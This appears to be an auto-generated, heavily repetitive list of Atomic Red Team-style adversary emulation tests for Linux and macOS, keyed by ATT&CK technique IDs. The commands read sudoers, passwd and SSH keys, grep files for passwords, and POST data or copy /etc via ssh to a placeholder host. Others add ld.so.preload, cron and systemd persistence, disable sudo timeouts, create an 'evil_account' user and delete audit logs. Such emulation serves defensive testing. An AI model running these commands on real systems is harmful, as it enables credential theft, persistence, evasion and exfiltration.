curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1154 ,T1040 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1136 ,T1153 ,T1081 ,T1018 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1501 ,T1154 ,T1040 ,T1135 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1064 ,T1145 ,T1201 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1136 ,T1153 ,T1145 ,T1201 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1064 ,T1081 ,T1083 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1215 ,T1154 ,T1081 ,T1201 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1153 ,T1081 ,T1087 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1064 ,T1040 ,T1018 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1501 ,T1154 ,T1145 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1153 ,T1040 ,T1201 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1154 ,T1040 ,T1083 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1501 ,T1154 ,T1081 ,T1018 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
